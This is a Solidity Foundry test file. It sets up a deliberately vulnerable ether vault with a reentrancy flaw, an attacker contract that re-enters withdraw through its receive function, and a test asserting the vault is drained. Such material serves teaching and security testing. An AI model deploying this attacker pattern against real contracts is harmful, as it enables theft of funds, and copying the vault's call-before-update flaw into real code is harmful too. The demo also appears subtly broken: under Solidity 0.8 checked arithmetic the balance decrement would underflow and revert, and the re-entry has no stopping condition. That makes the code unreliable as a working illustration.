// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract VulnerableVault is IVulnerableVault {
    mapping(address => uint) public balances;

    function deposit() external payable override {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public override {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerability: External call before state update (Reentrancy)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract Attacker {
    IVulnerableVault public vault;
    bool public attackInProgress;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
    }

    // Fallback function to re-enter the withdraw function
    receive() external payable {
        if (attackInProgress) {
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        vault.deposit{value: 1 ether}();
        attackInProgress = true;
        vault.withdraw(1 ether);
        attackInProgress = false;
    }
}

contract ExploitTest is Test {
    VulnerableVault vault;
    Attacker attacker;

    function setUp() public {
        // Deploy the vulnerable vault contract
        vault = new VulnerableVault();

        // Deploy the attacker contract
        attacker = new Attacker(address(vault));

        // Fund the vault with some ether
        vm.deal(address(vault), 10 ether);

        // Fund the attacker with some ether to start the attack
        vm.deal(address(attacker), 1 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker deposits 1 ether into the vault
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // Assert the vulnerability: Attacker should have drained more than 1 ether
        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vault).balance, 9 ether);
    }
}